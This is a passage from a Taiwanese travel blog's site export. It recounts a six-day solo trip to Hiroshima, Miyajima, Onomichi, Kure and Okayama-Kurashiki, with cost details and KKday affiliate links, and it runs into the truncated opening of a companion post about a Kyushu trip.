出發；但因還沒上班安排都很彈性，主要看機票價格何時來回比較低價決定。一波三折❌ 要去廣島最直覺的就是廣島機場進出，查了一下條件非常不好： 時間：晚去(17:20)早回(09:30)；並且週六沒有飛，週五(11/17)就要回來。 地點：需要搭交通車(約 55 分鐘)，去程落地後只能搭 21:40 or 22:20(末班) 到車站都 22 or 23 點了，時間很晚。 價格：~=$17,000，太貴。❌ 福岡進出+新幹線，依然不方便： 時間：去(16:30)、回(10:55)，也是晚去早回，但好一點。 地點：交通方便，但要再加上新幹線到廣島大概 1 個半小時。 價格：~=$12,000、如果要晚回(20:35) 要 ~=$17,000 或早上 06:50 的飛機。❌ 後來才查到去廣島，可以虎航岡山進出，去的動力普通： 時間：去(11:10)、回(15:25)，時間很讚。 地點：岡山機場同樣要搭交通車，但是落地時間早，時間充裕。 價格：含 +20 KG 託運來回約 ~= $14,000。因 9 月才去過「 九州 10 天 」散財，機票價格如果沒辦法壓在 1 萬上下，去的動力不大，因此幾乎要放棄此行了。✅ 虎航岡山冬遊記活動 ，出發：10/31 無聊滑 Facebook 時剛好看到有大大在「 日本自由行討論區 」社團 PO 文航空公司優惠降價活動，看到 虎航 11/3 10:00 ~ 11/6 23:59 購票有優惠；所幸就抱著隨遇而安的心態，有買到優惠就去沒有就算了。11/3 一早起來很幸運地有買到，去回日期最佳(11/13–18)、航班時間最佳、價格最佳的機票，那就沒有不去的理由了！ 去(11:10)、回(15:25)，含來回 20KG 託運＋選位＋雜費： $7,012KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 日本 JR PASS|關西&amp;廣島地區鐵路周遊券|eMCO 電子票 折鶴塔門票(廣島縣廣島市) 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊準備工作機票買好之後，距離出發也只剩下一週，如火如荼的直接開始準備工作。預計最想去的有宮島、尾道、倉敷美觀地區、岡山城；所以直接以廣島為基地，可以住比較多天，接近回程再住岡山一帶。行JR Pass 岡山&amp; 廣島 &amp; 山口地區鐵路周遊券 (¥ 17,000，剛好遇到 2023/10 月底後漲價。)查岡山廣到車站單程 ¥6,460，來回 ¥12,920；再算上去宮島、尾道、吳市…來回，應該不虧；直接買 JR Pass 最方便。住 (5 晚)東橫INN 廣島站棒球場前 (3 晚) 價格：$4,612，$1,537/晚，單人禁菸房 交通：從地圖上看走路距離蠻近的（實際大概要走 15 分鐘，因為在施工、而且要跨越平交道）不是熱鬧的地方，在 Mazda Zoom-Zoom 球場外，現在沒有比賽，整條路很冷清。東橫 INN 一如既往地 CP 值很高，價格跟環境都是這次住宿最優秀的。APA飯店 廣島站前大橋 (1 晚) 價格：$2,501，1 晚，單人禁菸房 地點：離廣島車站比較近，但實際走起來也不好走，要過大馬路、過橋(約 10 分鐘)；從上一個住宿地點走來大約 15 分鐘，算方便。因東橫 INN 訂不到四晚，只能一晚住 APA 飯店。利夫馬克斯岡山倉敷站前飯店 Livemax (1 晚) 價格：$3,263，1 晚，單人禁菸房 地點：跟地圖差不多，就在倉敷站外，走路大概五分鐘就到了，很方便。會找到倉敷是因為岡山在找住宿的時候已經訂不到價格可以接受的飯店了，只能就近往 JR 沿線找，因為倉敷也有交通車回岡山機場；就決定找倉敷附近的飯店了。這家也是倉敷唯一還有房間、地點方便、價格還可以接受的飯店。樂原本計畫如下： 11/13：逛街、吃廣島燒 11/14：宮島、廣島市區：嚴島神社、紅葉谷公園、宮島纜車 -&gt; 獅子岩展望台、原爆圓頂、平和紀念公園、原爆紀念館、紙鶴塔(廣島塔) 11/15：尾道、千光寺 11/16：吳市、廣島市區(同 11/14)、廣島城 11/17：岡山、倉敷：岡山後樂園、岡山城、吉備津神社、倉敷美觀地區、倉敷 Outlet、阿智神社 11/18：倉敷 Outlet、回程兔島車程太遠、不方便，只列入參考名單。Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。Day 1 出發早上 11:10 起飛，早上起來慢慢出門。從北車搭機捷前往桃園機場第一航廈，到報到櫃檯大約 08:50 分。沒什麼人，很快就完成報到＋出境； 一航 沒什麼吃的，隨便買了頂呱呱＋咖啡就去候機了。候機時還不怎麼餓，所以沒吃買的東西。11:07 起飛，14:11 抵達 OKJ (岡山桃太郎機場)；中間餓的時候想吃東西發現虎航是不允許帶自己東西上飛機吃的(樂桃則沒特別規定)，所以就乖乖地忍著，想說下飛機入境前在角落吃完才入境。岡山機場超級小，一路跟著人群走著走著就直接入境出關了，根本沒角落可以偷吃東西；因為頂呱呱有雞肉怕有防疫問題，所以整包直接上交給海關銷毀。約 14:40 就完成入境+提行李出來了（超快）後來查了一下航班，岡山機場飛機航班超少，國際線可能一天才一班，所以都沒人，只有同航班的人；海關、防疫犬會逐個檢查，但還是很快！一出來就直接上機場交通車，可能因為飛機航班太少，照班表要等到 16:10 才有交通車道岡山車站；但出機場就有加開的交通車可以直接上(滿人即發車、會再有下一班)，很貼心的為大家節省時間！下車後找到手扶梯往上前往岡山車站，先去換 JR Pass，找到綠色＆ 旁邊有寫「 EXPRESS予約、5489 お受取 」的機器兌換 JR Pass 票券。之前在網路找 兌換教學 ，是說要點選藍色「予約したきっぷのお受取り」但實際怎麼試、照步驟走，在掃描 QR Code 時都會出現「QR Code 無效」錯誤，改用輸入訂單編號也失敗。最後在一群台灣人互相多番嘗試下才發現要用左下「 QRコードの読取り 」黃色按鈕兌換，點擊後直接掃描 QR Code 就可以了。(猜測是 JR 機器有改版)機器會吐兩張說明書、 一張 JR Pass(圖中 ✔ 那張票) ，也可在拿到 JR Pass 後再放入 完成劃位 ， 進出站都是使用 JR Pass 那一張票 ，劃位的票僅供參考座位及時間，不能用那張票出入站。實在太餓了，都沒吃東西，先去超商買些東西果腹，因此買後幾班的 JR。約 16:45 抵達廣島車站。先去飯店 Check-in 放行李再出來覓食，沒有棒球比賽的時候這條路好冷清，對面就是鐵路，路上沒什麼店，但還好有一家很大的路面店 Lawson。廣島御好物語 站前廣場回廣到車站吃廣島燒「 廣島御好物語 站前廣場 」在廣島車站出來右手方 6 樓 (Ekie 百貨公司隔壁)；一出電梯就覺得好特別，這一整層全都是廣島燒店家，可以選擇自己喜歡的店家就坐。點了一個加年糕的廣島燒(裡面是炒麵)吃，覺得味道普普、裡面有麵和年糕，吃完很飽。回飯店路上買了個宵夜回去吃，這時間廣島的晚上好冷，大約 4 度而已。房間開箱。窗簾拉開就能看到外面的鐵道(約 10 條線，所以過平交道要快)；房間缺點是火車經過會有摳摳的聲音。Allite A1 65W 氮化鎵快充＋Allite 液態矽膠快充線這次出行直接帶了 Allite A1 65W 氮化鎵快充＋Allite 液態矽膠快充線 組合，自從換 iPhone 15 後基本上全設備都上到 Type-c 口了；出門旅行只要帶上 Type-c 充電線就能解決一切。Allite A1 65W 氮化鎵快充 支援單口 65W、雙口 45W+18W 快速充電；體積小可隨身攜帶，在外看到可充電的插頭直接插上續力；回飯店後就一口充行動電源，一口充手機、手錶、iPad 或 Switch，方便又快速。Allite 液態矽膠快充線 (1.5m) 長度很夠，可以直接行動電源放包包接線出來使用，液態矽膠材質與一般塑膠不同，除了親膚之外、還更容易彎折好收納、不會凹來凹去。這次出行的最佳充電拍檔。Day 2 宮島(嚴島神社)、紅葉谷公園、獅子山展望台、原爆圓頂、平和紀念公園 KKday 行程參考： 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊宮島一早搭乘 JR 前往宮島口站，出站往碼頭方向走就能找到渡輪站；JR Pass 有包含宮島渡輪船票，不需再買船票，但要額外付 宮島訪問稅(¥100) ，會有站務人員指引購買訪問稅的票。 另外也可搭乘廣電到宮島口，但我記得時間比較久。渡輪約 10 分鐘就能抵達宮島，渡輪很平穩也不會有柴油味，快抵達時就能遠遠到海上鳥居！上島後直接往海上鳥居方向走，在路上岸邊斜斜著拍也很美而且比較沒人。島上也有很多野生的鹿，會亂咬東西 XD。經過嚴島神社後先前往宮島纜車上獅子岩展望台。需搭乘兩段纜車才能到獅子岩展望台，先直攻纜車的好處是幾乎沒人(山下嚴島神社一堆人)，第一段是小纜車最多 6 人(發車很密集、距離較長)，第二段是比較大的纜車(沒記錯是 15 分鐘一班，可容納較多人(約 20 人)，距離很短)。山頂可以鳥瞰整個瀨戶內海，吹吹風看看小島，很愜意。嚴島神社就是直接架在海邊上的，水很乾淨，走起來很清幽；也可以排隊從正面拍攝海上鳥居的照片。這個季節的潮汐退潮時間是凌晨 3 點或下午 5 點，這次就沒機會看到退潮的巖島神社跟鳥居了。午餐當然要吃牡蠣， 牡蠣屋 的牡蠣飯、炸牡蠣，各 300 多台幣，好吃又便宜，牡蠣富翁！宮島纜車、嚴島神社門票。買了一座小的嚴島神社鳥居回家放著，很可愛！原爆圓頂、平和紀念公園下午時分回到廣島市區，到原爆圓頂、和平紀念公園走走。秋季的廣島，有銀杏的黃與楓葉的紅還有些綠葉的點綴加上秋季的涼風颼颼，緬懷廣島曾經發生的一切。 在平和紀念公園遇到很多日本國中小戶外教學，有老師帶著講解歷史，深刻覺得日本民族對歷史傳承教育的重視。回飯店接近傍晚時分就回到飯店休息，因為穿太少，外面實在太冷。晚餐直接買了回飯店路上經過的「 炭火焼肉 敏 猿猴橋店 」的外帶燒肉餐盒；這家店起初會吸引我的目光是因為在店門口有放幾個炭爐，走過去非常溫暖，停下來看了下招牌發現有提供外帶餐盒，就走進去了！另一個新奇的事是他的餐盒是有自熱功能，回飯店要吃的時候拉一下線，就會開始自己加熱冒熱蒸汽；什麼時候吃都像剛出爐熱熱的，很貼心。今日超商宵夜，熱狗、炸雞、Strong Zero、還買了瓶號稱喝完很好睡的養樂多 Y1000 試試看。(但今天走了一整天本來就很好睡)Day 3 尾道、千光寺、福山、鞆之浦早上搭乘新幹線前往三原，再從三原轉車到尾道站。時間沒有抓好，三原換尾道的時候乾等了 30 幾分鐘。往南出口走正門出尾島站。天氣好加上溫度適宜，出尾島站之後就一路往千光寺走；走山的那側有像走在九份山城的感覺，路途不太好走，很多樓梯跟陡坡往上，往另一側看就是尾道內海，風景不錯。另一個選擇是直接走大馬路，走到看到千光寺纜車搭乘的招牌，轉進去就能直接搭纜車上到千光寺了。千光寺的風景很好，可以鳥瞰整個尾道市區與遠方的尾島大橋。請了一尊可愛的小地藏王回家放著（可以選擇寫下願望放在千光寺供養或是帶回家紀念）：參拜完千光寺，往下走就是貓之細道。看早期網路文章都以日本侯桐介紹貓之細道，但今年實際走訪覺得不太一樣；貓之細道是千光寺下山的一小段小徑，沒看到一隻野貓，沿路的貓咪咖啡廳幾乎都沒營業了，走下來有點落寞的感覺，最後找了一家還有在營業的咖啡廳「 ブーケ ダルブル 」喝杯咖啡休息一下。店的地理位置不錯，但走上來的途中同樣散發著落寞雜草叢生的感覺，店裡位子不多、餐點選擇也不多；但老闆很熱情＋店貓很黏人會跑來你旁邊坐著貼貼。走回山下大街的路上遇到一個當地很寂靜的神社。回尾道站的路上改走裡面的商店街，午餐就吃了有名的尾道拉麵 — 「 Onomichi Ramen Shoya 」。尾道拉麵（台灣人創始的）蠻特別的，漂浮著滿滿白花花的豬背脂、還有筍乾。悠閒晃回尾道站後，由於時間還很早，臨時決定前往鄰近的福山市。 時間又沒算好，又多乾等了 30 分鐘才等到車，要來尾道的朋友記得抓好時間。福山福山站後站可以看到福山城，沒有特別進去，只遠遠的拍張照就走了。鞆之浦回到福山站前站，就可以看到往「鞆之浦」的公車搭乘指示，本來看地圖覺得鞆之浦很難到達，因為在海邊小鎮，不得不佩服日本的觀光與交通指示，非常清楚。 p.s. 行前對鞆之浦沒有特別做功課，算是臨時起來走走的 對鞆之浦的了解只有崖上的波妞取景地、日本第一個現代港都、曾經是坂本龍馬談判之地、歷史控必訪上車後一路坐到底站就是鞆之浦囉(車程時間約：40 分鐘)仙醉島直接參考當地的旅遊地圖，想說先去仙醉島看看風景。下車後直接往回走到「福山市營渡船場」搭乘渡輪前往仙醉島(約 10 分鐘)。船身古色古香，一種突然成為航海王的感覺，路程雖短，但是能鳥瞰瀨戶內海及仙醉島、吹吹風，很舒服。上島後沒看見任何路人，島上一片荒涼，原本的鞆の浦海水浴場遊客中心也已經關閉準備拆除、往山上其他海岸的步道也都因落石封閉；只剩路口還有一家風呂飯店還有營業。鞆の浦海水浴場只剩下一大片寧靜的海灘，只有偶爾能聽到一群海鴨子的嬉戲聲。(我也是第一次看到鹹水鴨，不是鹹水雞)大約只停留了 15 分鐘，沒地方可去就等待渡輪回去了；這地方雖然荒涼但還是有販賣機！回程路上近看了遠方的弁天島，一個孤單矗立在海中間的小島及鳥居。鞆之浦回到鞆之浦時間也接近傍晚時分，晃晃悠悠走到港口看常夜燈與日式城鎮風景，路上有需多人及攝影愛好者都已經坐在港口旁的階梯、架好相機，等待日落的到來。鞆之浦有名的滋補養身保命酒，路上有濃濃的藥酒味；因為還要趕路回廣島，所以就趁還沒天黑之前搭乘公車回福山了。回福山後直接跳上往廣島的列車，告別了這座寧靜平和的城市，晚餐依然直接買回飯店路上的「 炭火焼肉 敏 猿猴橋店 」外帶燒肉餐盒。另外多加了兩顆超商的炸牡蠣(1顆100日元而已)。宵夜依然是 Y1000+超商熱食。Day 4 吳市、廣島市區最後巡禮(廣島和平紀念館、廣島城、縮景園)一早先 Checkout 東橫 INN 拖著行李前往晚上要下榻的 廣島 APA 飯店。寄放好行李後，就走回廣島車站搭乘前往吳市(Kure)的列車(約 50 分鐘)，快到吳市的時候從右邊窗戶往外看有一種回到福隆、宜蘭路線火車的感覺，左邊山右邊臨海，風景愜意。出站後可以去觀光案內所，拿吳市的旅遊指南。(覺得設計的很好！)依照指標就能從車站出來的空橋一路走到港口的大和博物館與海上自衛隊吳史料館。走到底的時候先不要急著下空橋，從空橋上能很好的補捉海上自衛隊吳史料館 — 潛水艦艇。 給未來要來吳市、廣島的朋友作行程安排參考，吳市也可以坐船去宮島及回到廣島，本來有想坐船回廣島，但時間沒搭上，這次就先放棄了。大和博物館裡面有一艘能近距離 360 度觀看的大和戰艦、細節幾乎拉滿，還有戰艦、戰爭的歷史、戰鬥機、大砲…等等，戰艦迷與軍事迷不容錯過；另外剛好遇到特戰，展出日本航母設計、發展史，連設計手稿有。海上自衛隊吳史料館離開大和博物館之後往後面走就是海上自衛隊吳史料館，可以免費入內參觀。博物館內部主要展示潛水艇內部生活環境、工作環境、引擎、水雷，還有歷史。最後最特別的是真的能進入潛水艇，參觀真實的機艙、宿舍、船長室、駕駛室及使用潛望鏡看外部環境。吳市商店街逛完博物館也接近中午時分準備覓食，本來想直接吃海軍咖哩，但查了一下評價好像沒什麼特別的，就先走回吳市商店街再做決定。(其實蠻遠的，再反方向，走路大概花了快 30 分鐘)最後選擇吃吳市冷面，類似涼麵＋豚骨叉燒，麵會冰鎮過，味道爽口，麵量偏多，可以點小份的就好。吃飽準備回車站，路上順路也買了「福住炸紅豆蛋糕」味道偏甜偏油，吃起來很普通；另外也順路買了海軍咖啡、咖哩當伴手禮( subarucoffee_store/ ，店員很親切熱情)。一路再走回吳站，搭列車回廣島。回廣島後最後的廣島市區巡禮，廣島車站出來就有三條路線的觀光巴士可供選擇搭乘(包含在 JR Pass 內)，可以依照自己想去的方向選擇。我想先去縮景園(廣島美術館)，所以選擇搭乘紅色楓葉號。縮景園縮景園就在廣島美術館後面，買票的時候也可以買縮景園+廣島美術館套票。縮景園是個很別緻的小庭院，裡面有很多景觀的縮小造景，例如楓葉、小橋流水、竹林、松柏、山丘. . .等等，走一走看看風景挺不錯的。廣島城下一站漫步到廣島城，廣島城已在核爆中消失，目前的廣島城是後來復建的，整體很新，高度也不高，天守閣看不太到什麼風景。平和紀念館、平和紀念公園最後一站再次回到平和紀念公園，旁邊就是 紙鶴塔(高度不高，沒進去) 。剛好遇到下午時香取慎五吾來弔念。排隊買票參觀和平紀念資料館，裡面有非常豐富的核爆過程、歷史，還有資料照片、物件；整體參觀下來非常沈重震撼。公園的另一邊還有祈念館，太沈重就沒進去了。晚間時分下起毛毛細雨，搭配著剛看完慘痛歷史教訓的心情，回到廣島車站。隨手在車站買了些伴手禮與車站的外帶便當就回飯店休息了，今天還要洗衣服呢。APA 真的隨處可見社長，社長咖哩、社長水、社長的書…房間密度也是一如往常的密集，一層 60 幾間。房間內一樣不大、設施齊全、電子設施也很方便(房間內就能看到洗衣房動態、電視能直接 Airplay)。洗衣服的時候遇到大麻煩，大排隊，整棟 1000 多個房間只有 7 台洗衣機，最後抓準時機，洗衣機快結束時下樓排隊，最後在 11 點多才洗好烘好衣服(還沒乾，回房間繼續晾)。弄到這麼晚，今天吃宵夜很合理！還是 Y1000 + 牛奶 + 超商熟食。Day 5 倉敷、岡山一早風光明媚，天氣晴朗；Chekout 飯店、跟廣島說再見，前往倉敷的下塌飯店寄放行李(也能先寄放在岡山，因為去倉敷還是要先到岡山)。倉敷美觀地區、阿智神社第一站先來到阿智神社，地勢較高能鳥瞰整個倉敷地區，沒什麼人很清幽。阿智神社不大但有名的有繪馬亭、如果抽到不好的籤可依照自己的生肖綁在對應的獸首下、還有求良緣的 花纏守 ：花纏守 ，感謝 Angie 提供。美觀地區不大，但很清幽好逛，遊船因為當日傳票已售罄就沒機會體驗了，但在周邊巷弄走走逛逛也很舒服。午餐吃了有名的 三宅商店 咖哩套餐，咖哩濃郁搭配牛蒡絲很好吃。吃完繼續逛，逛累了跑去吃 パーラー果物小町 (特色是店員會穿著大正時代的女僕裝)水果聖代，岡山晴王葡萄＋水果冰淇淋，葡萄甜到發麻。伴手禮可以買 GOHOBI 倉敷特產膠原蛋白岡山水果果凍。岡山後樂園點燈、岡山城伴隨著夕陽搭乘列車回到岡山站，出站直接搭乘路面電車就能到岡山城周遭。第一站先去岡山後樂園，晚上點燈的感覺很是浪漫美麗。 岡山後樂園＋岡山城每年 11 月中下旬會有點燈活動。順路去隔壁的岡山城看夜景，在楓葉加燈光的映照下別有一番風味。晚餐方便解決，就地吃了一風堂拉麵，再一路漫步回岡山站(路上也有點燈，很美)，回倉敷前還有點時間逛了一下激安殿堂(唐吉訶德)，沒什麼伴手禮，還是要去岡山車站或百貨公司才有賣伴手禮…回倉敷已是晚間時分，天氣寒冷，路上的人也都急匆匆地要趕回家，倉敷站後站的 Outlet 也已關門。才發現這家飯店沒有 24 小時櫃檯，還好沒有太晚回來！但這家飯店的房內設施很齊全，微波爐、熱水壺、眼鏡清洗機都有。在日本的最後一晚只簡單吃了超商雞塊＋Y1000 跟多買一瓶白桃草莓牛奶當宵夜，就沈沈睡去。Day 6 岡山、返程一大清早天剛亮，就 Checkout 出門前往岡山。 預計由岡山搭乘機場交通車回機場， 倉敷也有直達岡山機場的交通車但班次較少( 詳細請參考官網 ) ，昨天岡山也還沒逛完，就打算直奔岡山再從岡山回去了。吉備津神社底搭車站後直奔吉備津神社參觀(車程約 30 分鐘)，出車站大約要再走 15 分鐘才會抵達，有個歷史悠久的檜木長廊，及銀杏與歷史建築，很好走走參拜。路上還有另一個在山腳另一邊的吉備津彥神社順路也可以一同參拜，但因為j時間不夠所以這次就跳過了。岡山 AEON回岡山車站後去附近的 AEON 百貨買買伴手禮、逛逛街，吃個午餐天婦羅蕎麥麵，就準備去排機場交通車回岡山機場了。 排交通車的人很多，但不用緊張上不了車，因為會有加開車次保證大家都能到機場。岡山桃太郎機場 (OKJ)機場有點年代、跟熊本機場差不多小，約 13:50 就完成安檢+報到+出境，距離起飛時間 15:25 還有快 2 個小時。機場班次超少，就是只有同個航班的人，大概只花不到 15 分鐘就完成報到＋掛行李，更特別的是岡山機場小到 X 光機是放在機場大廳的，大廳過完 X 光貼上封條，再去報到(如果打開行李會被要求重新過安檢)。掛完行李在航站樓(總共2樓而已)晃了一下，有一個觀景台可以瞭望，還有咖啡廳跟幾家餐廳可以吃東西，等累了買了一顆白桃冰淇淋大幅來吃。安檢也很快，但岡山機場如果穿靴子是要脫下來安檢的，這點比較麻煩。遇到班機延誤，在候機室等啊等，最後 16:24 才起飛(延誤快一小時)。 再見，岡山、再見，廣島。伴手禮開箱插曲繼上次「 2023 九州 10 日自由行獨旅 」後面幾天其實有一種說不出的孤獨感，一是一個人去陌生的地方、二是不會講日文 10 天幾乎沒講話；那種孤獨感依然記憶猶新，所以並沒有很想再去，是因為即將要工作加上剛好有買到超級特價的機票才出發。第一天再換 JR Pass 時剛好卡住、剛好遇到一群同樣卡住的台灣人、剛好跟前面的台灣人輪流試才成功、剛好她也是去廣島、剛好她進站卡住提醒了她、剛好都買到下下班列車、剛好她買自由座、剛好都想先去超商、剛好是同個業界所以很有話題，剛好都是一個人去，於是第一天就組團一起走完相同的行程了。 很多行程、景點跟時間安排都是 Angie 提供的資訊，如果是本來我自己走可能就會亂走或錯過，然後又孤獨的狂走完 6 天。— — —KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 日本 JR PASS|關西&amp;廣島地區鐵路周遊券|eMCO 電子票 折鶴塔門票(廣島縣廣島市) 日本.宮島|紅葉谷公園・參拜大聖院、嚴島神社|人力車體驗 廣島、宮島巴士一日遊 如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝。更多遊記 [遊記] 2024 山陰地區( +關西) 島根鳥取姬路大阪 7 日獨旅自由行 [遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境 [遊記] 2023 九州 10 日自由行獨旅 [遊記] 9/11 名古屋一日快閃 [遊記] 2023 東京 5 日自由行 [遊記] 2023 京阪神 8 日自由行有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看如果這篇文章對您有幫助，歡迎使用我的 推廣連結 選購 KKday 商品、行程，我將獲得部分收益，持續更多旅遊創作，謝謝： Follow Me on Medium 981+ Followers 12,261 Total Views Last Statistics Date: 2025-01-19 | 12,234 Views on Medium. " }, { "title": "遊記 2023 九州 10 日自由行獨旅", "url": "/posts/d78e0b15a08a/", "categories": "Z 度旅行遊記", "tags": "生活, japan, kyushu, fukuoka, kumamoto", "date": "2023-10-04 12:46:37 +0800", "snippet": "[遊記] 2023 九州 10 日自由行獨旅九州 10 日自由行 福岡、長崎、熊本 走馬看花紀錄[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保前言8 月底正式離開待了快 3 年的 Pinkoi；原本就有想離開的念頭，上半年時想說把假期放一放，去外面透透氣，回...", "content": "[遊記] 2023 九州 10 日自由行獨旅九州 10 日自由行 福岡、長崎、熊本 走馬看花紀錄[2024 Update] 九州二訪 2024 六月份二次造訪九州 (9 日 + 2 日韓國) 從韓國釜山搭乘新山茶花號郵輪入境日本博多，遊歷由布院、大分、福岡、下關、絲島、佐世保前言8 月底正式離開待了快 3 年的 Pinkoi；原本就有想離開的念頭，上半年時想說把假期放一放，去外面透透氣，回來再看情況，於是和朋友去了「 [遊記] 2023 京阪神 &amp; 🇯🇵初次著陸 」和同事去了「 [遊記] 2023 東京&amp; 🇯🇵二次著陸 」；但回來之後反而更想真正跳脫，剛好手上的事也告一段落，就鼓起勇氣跨了出去，離開舒適圈，尋找下一個新挑戰！「 [遊記] 9/11 名古屋一日快閃 」純屬意外，如文內所說比較像行軍而不是放鬆的旅行。趁著難得的空檔再去探索一次日本，原本的計畫是找同樣在待業的朋友一起去 🇰🇷 釜山 ➡️ 🇯🇵 福岡 ➡️ 🇯🇵 熊本 的路線 ；韓國去熊本回，途中釜山到福岡可以搭乘 新山茶花號 ，睡一晚 12 小時就到福岡，等於通勤＋住宿全包。朋友 9 月就找到工作去上班了，一時之間也找不到新旅伴；一個人去不太想要大範圍移動，所以先捨棄了🇰🇷 釜山 ➡️ 🇯🇵 福岡 段，改成 🇯🇵 福岡 ➡️ 🇯🇵 熊本，福岡進熊本回的路線。10 月開始時間都很零散也想說 10 月要開始準備找新工作，所以出發日就訂在 9 月底 (9/17–9/26)。總結 / Retro一樣把總結、檢討寫在前面，在自由行社團看到一段話很喜歡：「自由行就是不斷地繳學費(花時間或金錢)學習，經驗多了會踩的坑也越來越少」。👍 生可樂、蜜桃水、全家的果汁飲料、秋雅梅酒，好喝！ 日本職棒值得一看！買票記得買整排空或是靠走道的位子、便宜的位子就好 JR Pass 不一定省，但在九州真的有省到！至少省了 1,000 多台幣 獨旅也遇到很多有趣的事；例如途中幫助了日本家庭獲得三原市的伴手禮、好心的外國姊姊主動幫拍照、一起游船的路人台灣家庭、一起走完阿蘇的台積電大哥、在熊本幫忙路人家庭拍照結果又在機場遇到又再幫他們拍一次…等等 九州(不只熊本)到處都有熊本熊部長的蹤跡 整個九州都很空曠，都沒什麼人，名店吃的、景點幾乎不用排隊，很舒服 日文稍微進步一點，聽得懂數字(雖然還是要先用 Google 翻譯確認沒唸錯)、聽得懂要不要塑膠袋；知道結帳、這個、以上就好、現金、信用卡、免稅的祈使句(XXX お願いします) 完成遊記撰寫！👎 這次住到雷：日本找飯店也還是要看評價，最好直接看低分評價的內容，看能不能接受、再打開街景實際走看看好不好走 這次熊本排太多天，應該 2 天就好，其他天可以去大分；而且福岡熊本其實比福岡長崎還近很多：以往都是先找住宿再找景點，九州幅員遼闊；應該要先找想去的地方再來排住宿，能去的景點會更多 福岡住宿的選擇、價格、品質都比熊本好太多 這次錯過了由布院的祭典(那天我跑去長崎)：之後可以查查去的日期有沒有祭典，大家都推祭典，一定要去 JR Pass 可以搭新幹線，但「希望(Nozomi)號」、「瑞穗(Mizuho)號」不行；搭了要補票 獨旅+語言不通其實蠻孤單的，更多時候是自我沉靜享受孤獨 獨旅找住的比較貴 這次依然狂走景點，應該放慢腳步慢慢享受當下跟尋找美食；尤其日本過吃飯時間就沒有有名的店吃了 這季節九州的太陽還是很曬，要做好防曬 北長崎普普(荷蘭、中華街)，南長崎跟夜景比較有特色KKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應）準備工作行最一開始考慮 福岡進福岡出，熊本一兩日來回(後面證明這才是對的ＸＤ，熊本景點不多不用待太多天)；查到華航有一班福岡進熊本回的班機，還便宜 $1,000，就決定是此航班了。因為時間相當充裕就找了最奢侈的中午出發中午回的時間，包含飛機時間一共 10 天。 去程：9/17 CI 116 16:40 TPE -&gt; 20:00 FUK 回程：9/26 CI 2195 ( 9/26 新開航 ) 12:30 KMJ -&gt; 13:34 TPE價格： $10,048因為九州幅員遼闊，這次有買 JR Pass 北九州鐵路周遊券 (5 日)，想說怎麼坐都還是賺。住 (9 晚)安排的時候沒想太多也沒查資料，想說福岡、熊本都沒去過；就抓個一半一半 5天:4天 住。福岡 5 晚— 福岡天神本尼卡卡爾頓飯店 ( Benikea Calton Hotel Fukuoka Tenjin ) 價格：$7,583，$1,516/晚 交通：從博多站出發，可以搭地鐵七隈線到渡邊通站或搭公車走 5 分鐘到達熊本 4 晚 — Green Rich飯店 — 水前寺 ( Green Rich Hotel Suizenji )JR 熊本 -&gt; 飯店飯店 -&gt; 熊本機場熊本住宿很難找(不知道是不是都被台積電出差訂走的關係)，選擇少、價格比福岡貴、老舊；最後只找到這家，價格相對便宜的飯店。 價格：$8,157，$2,039/晚 交通：JR 熊本站出來改搭豐肥本線在搭路面電車出來就到了(市立體育館前站)， 回程去機場的交通也很方便，出來就有機場直達車到熊本機場飯店訂好了，就可以填寫線上的 預定入境申請 。樂原本的計畫如下： 9/17 21:00 到福岡 22:00 到飯店，應該就外面屋台逛逛 9/18 長崎 (新地中華街/荷蘭坂/哥拉巴園/大浦天主堂/Gunkanjima Digital Museum/眼鏡橋)不會都去+ 原爆資料館＋和平公園 + 晚上稻佐山山頂展望台 看夜景 9/19 柳川、太宰府一日遊 + LaLaport 福岡(optional) 9/20 門司港、小倉城一日遊 + 屋台 9/21 博多逛街 (福岡塔、神社、運河城、天神地下街…) 9/22 博多逛街＋移動到熊本+ 水前寺成趣園 9/23 熊本市區、熊本城、熊本熊部長參見 9/24 阿蘇火山一日遊 9/25 島原城、島原三柴犬 (很遠，考慮) 9/26 10:00 熊本機場 12:30 起飛回程Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。這次也是非常衝動，9/10 買好機票+訂好房，9/15 計劃好行程，9/17 出發！Day 1 出發下午 16:40 的班機，有很充裕的時間慢慢起床、慢慢出門。到達機捷 A1 台北車站後，一樣選擇預辦登機，直接在北車完成報到＆掛行李，到機場就直接走出境，不用跟人擠櫃檯排隊 ( 預辦登機資訊請參考官方網站 )。這次也在托運行李放 Airtag 追蹤行李位置，不怕行李遺失、等轉盤的時候也很方便。約莫 13:00 抵達機場，直接出境亂晃。隨便吃了很貴又普通的口水雞，順手看了一下行李位置；行李也跟隨我托運到機場了。吃飽之後大概才 